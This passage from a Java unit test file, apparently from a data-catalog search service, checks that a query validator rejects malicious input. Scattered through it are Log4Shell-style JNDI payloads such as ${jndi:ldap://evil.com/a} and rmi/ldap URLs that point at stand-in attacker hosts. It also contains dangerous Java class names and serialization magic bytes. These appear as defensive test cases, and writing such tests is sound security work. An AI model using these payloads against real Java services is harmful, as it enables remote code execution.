                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    assertNotNull(resultNullFlags);
  }

  @Test
  public void testFieldConfigurationWithStructuredQuery() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "structured",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder().replace(List.of("keyPart1", "urn")).build())
                        .build()))
            .queryConfigurations(
                List.of(
                    QueryConfiguration.builder().queryRegex(".*").structuredQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
        new SearchFlags().setFulltext(false).setFieldConfiguration("structured");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Note: Current implementation doesn't apply field configuration to structured queries
    // This test documents that behavior
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                false);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();

    // Structured query should still use all fields (field configuration not applied)
    QueryStringQueryBuilder structuredQuery = (QueryStringQueryBuilder) shouldQueries.get(0);
    Map<String, Float> fields = structuredQuery.fields();

    // Should contain all standard fields, not just the replaced ones
    assertTrue(fields.size() > 2);
    assertTrue(fields.containsKey("customProperties"));
  }

  @Test
  public void testValidateSearchQuery_ValidQueries() {
    // These queries should all pass validation without throwing exceptions
    List<String> validQueries =
        Arrays.asList(
            "test query",
            "user:john AND department:engineering",
            "name:dataset*",
            "field:value OR field2:value2",
            "exact phrase search",
            "special-chars_allowed.here@example.com",
            "unicode支持中文",
            "numbers 12345",
            "*",
            "",
            "  whitespace  ");

    for (String query : validQueries) {
      // Should not throw ValidationException
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_NullByte() {
    String maliciousQuery = "test\u0000query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_Bell() {
    String maliciousQuery = "test\u0007query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_Delete() {
    String maliciousQuery = "test\u007Fquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaUtil() {
    String maliciousQuery = "java.util.HashMap";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaLang() {
    String maliciousQuery = "java.lang.Runtime";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaxNaming() {
    String maliciousQuery = "javax.naming.Context";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_SpringFramework() {
    String maliciousQuery = "org.springframework.context.ApplicationContext";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_ComSun() {
    String maliciousQuery = "com.sun.jndi.rmi.registry.RegistryContext";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_CaseInsensitive() {
    String maliciousQuery = "JAVA.UTIL.HashMap";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_LDAP() {
    String maliciousQuery = "ldap://attacker.com/exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_RMI() {
    String maliciousQuery = "rmi://evil.com:1099/Exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_DNS() {
    String maliciousQuery = "dns://malicious.example.com";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_IIOP() {
    String maliciousQuery = "iiop://evil.com:900/obj";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_JNDI() {
    String maliciousQuery = "jndi:ldap://attacker.com/a";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_Oastify() {
    String maliciousQuery = "test.oastify.com";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_CaseInsensitive() {
    String maliciousQuery = "LDAP://ATTACKER.COM/exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_SerializationMagicBytes_Unicode() {
    String maliciousQuery = "test\u00ac\u00edquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_SerializationMagicBytes_Escaped() {
    String maliciousQuery = "test\\xac\\xedquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ExceedsMaxLength() {
    // Create a query that exceeds the max length
    // Assuming default max is 1000 characters based on typical configuration
    StringBuilder longQuery = new StringBuilder();
    for (int i = 0; i < 1001; i++) {
      longQuery.append("a");
    }
    TEST_BUILDER.validateSearchQuery(longQuery.toString());
  }

  @Test
  public void testValidateSearchQuery_MaxLengthBoundary() {
    // Create a query at exactly max length - should pass
    // This test assumes max length of 500
    StringBuilder query = new StringBuilder();
    for (int i = 0; i < 500; i++) {
      query.append("a");
    }
    // Should not throw exception
    TEST_BUILDER.validateSearchQuery(query.toString());
  }

  @Test
  public void testValidateSearchQuery_ComplexValidQuery() {
    // Complex but valid query with various operators and special chars
    String complexQuery =
        "name:dataset* AND (tags:pii OR tags:sensitive) "
            + "NOT deprecated:true platform:\"snowflake\"";
    TEST_BUILDER.validateSearchQuery(complexQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_Log4ShellPattern() {
    // Test Log4Shell-style attack pattern
    String maliciousQuery = "${jndi:ldap://evil.com/a}";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ObfuscatedJNDI() {
    // Test obfuscated JNDI pattern
    String maliciousQuery = "test ${jndi:rmi://attacker.com:1099/obj} query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_URLsInData() {
    // URLs in actual data should be allowed (not JNDI protocols)
    List<String> validURLQueries =
        Arrays.asList(
            "https://example.com",
            "http://mysite.com/page",
            "ftp://files.example.com",
            "mailto:user@example.com");

    for (String query : validURLQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_JavaKeywordsInData() {
    // Java keywords in actual data context should be allowed
    // (the pattern looks for package structures)
    List<String> validQueries =
        Arrays.asList("java developer", "util function", "naming convention", "language support");

    for (String query : validQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_CombinedAttack() {
    // Combination of multiple attack vectors
    String maliciousQuery = "java.lang.Runtime ${jndi:ldap://evil.com/x} \u0000";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_EmptyAndWhitespace() {
    // Edge cases that should be valid
    TEST_BUILDER.validateSearchQuery("");
    TEST_BUILDER.validateSearchQuery("   ");
    TEST_BUILDER.validateSearchQuery("\t");
    TEST_BUILDER.validateSearchQuery("\n");
  }

  @Test
  public void testValidateSearchQuery_SpecialSearchSyntax() {
    // Valid Elasticsearch/OpenSearch query syntax
    List<String> validSyntaxQueries =
        Arrays.asList(
            "field:value",
            "field1:value1 AND field2:value2",
            "field:value*",
            "field:[1 TO 100]",
            "(field1:value1 OR field2:value2) AND field3:value3",
            "field:\"exact phrase\"",
            "_exists_:field",
            "field:>100",
            "field:>=100 AND field:<=200");

    for (String query : validSyntaxQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testBuildQuery_ValidationApplied() {
    // Test that validation is actually applied during query building
    TEST_BUILDER.buildQuery(
        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "java.lang.Runtime", true);
  }

  @Test
  public void testBuildQuery_ValidQuerySucceeds() {
    // Test that valid queries pass through validation and build successfully
    QueryBuilder result =
        TEST_BUILDER.buildQuery(
            opContext,
            ImmutableList.of(TestEntitySpecBuilder.getSpec()),
            "valid search query",
            true);
    assertNotNull(result);
  }

  @Test
  public void testValidateSearchQuery_EdgeCasePatterns() {
    // Test patterns that might look suspicious but are valid
    List<String> edgeCaseQueries =
        Arrays.asList(
            "javascript:void(0)", // javascript protocol (not JNDI)
            "file:///path/to/file", // file protocol (not JNDI)
            "data:text/plain,hello", // data URI (not JNDI)
            "java_developer", // underscore separator
            "util_function", // not a package reference
            "my-ldap-server", // ldap in name but not protocol
            "rmi_connection", // rmi in name but not protocol
            "javax.annotation @Override" // annotation reference in text
            );

    for (String query : edgeCaseQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaIO() {
    String maliciousQuery = "java.io.FileInputStream";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaxXML() {
    String maliciousQuery = "javax.xml.transform.Transformer";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_OrgApache() {
    String maliciousQuery = "org.apache.commons.collections.Transformer";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_Unicode() {
    // Unicode characters should be allowed
    List<String> unicodeQueries =
        Arrays.asList("用户名称", "データセット", "사용자", "Пользователь", "مستخدم", "emoji🔍search");

    for (String query : unicodeQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_StructuredQueryPrefix() {
    // Test that structured query prefix doesn't interfere
    String structuredQuery = STRUCTURED_QUERY_PREFIX + "field:value";
    TEST_BUILDER.validateSearchQuery(structuredQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_StructuredQueryWithAttack() {
    String maliciousQuery = STRUCTURED_QUERY_PREFIX + "java.lang.Runtime";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testCustomBuilder_ValidationApplied() {
    // Test that custom builder also applies validation
    TEST_CUSTOM_BUILDER.buildQuery(
        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "ldap://evil.com/a", true);
  }

  @Test
  public void testValidateSearchQuery_QuotedStrings() {
    // Quoted strings should pass validation
    List<String> quotedQueries =
        Arrays.asList(
            "\"exact phrase match\"",
            "'single quoted'",
            "field:\"quoted value\"",
            "name:'John Doe'");

    for (String query : quotedQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_QuotedMalicious() {
    // Even quoted malicious content should be blocked
    String maliciousQuery = "\"ldap://evil.com/a\"";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_Numbers() {
    // Numeric queries and ranges should be valid
    List<String> numericQueries =
        Arrays.asList("12345", "price:>100", "count:[10 TO 100]", "year:2023", "-42", "3.14159");

    for (String query : numericQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_BooleanOperators() {
    // Boolean operators should be valid
    List<String> booleanQueries =
        Arrays.asList(
            "term1 AND term2",
            "term1 OR term2",
            "NOT term",
            "term1 AND (term2 OR term3)",
            "+required -excluded",
            "term1 && term2",
            "term1 || term2");

    for (String query : booleanQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_CorbaProtocol() {
    String maliciousQuery = "corba:iiop://evil.com:900/obj";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_WildcardsAndRegex() {
    // Wildcards and basic regex patterns should be valid
    List<String> wildcardQueries =
        Arrays.asList("test*", "?est", "te?t*", "field:test*", "field:/regex.*/", "*:*");

    for (String query : wildcardQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }
}
